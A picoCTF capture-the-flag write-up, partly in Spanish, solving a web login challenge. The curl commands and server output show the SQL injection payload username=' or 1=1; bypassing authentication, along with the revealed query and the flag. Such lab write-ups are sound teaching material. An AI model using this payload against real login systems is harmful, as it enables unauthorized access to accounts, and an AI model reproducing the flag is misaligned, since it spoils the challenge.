## Description

There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!
#### hints
- There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
- Try to think about how the website verifies your login.
## Solución
```shell
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/50009/login.php -d 'username=admin&password=admin'
<h1>Login failed.</h1>                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/50009/login.php -d "username=' or 1=1;&password=admin&debug=1"
<pre>username: ' or 1=1;
password: admin
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='admin'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_fb3fe2ad}</p>                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 

```
## Bandera
```css
flag: picoCTF{s0m3_SQL_fb3fe2ad}
```
## Notas Adicionales
Se intentó acceder a una página de inicio de sesión vulnerable a inyección SQL. En el primer intento, las credenciales `admin:admin` fallaron. En el segundo intento, se utilizó la inyección SQL `"username=' or 1=1;"`, que modifica la consulta SQL para que siempre sea verdadera (`1=1`), permitiendo el inicio de sesión sin credenciales válidas.
# comandos utilizados

## Referencias
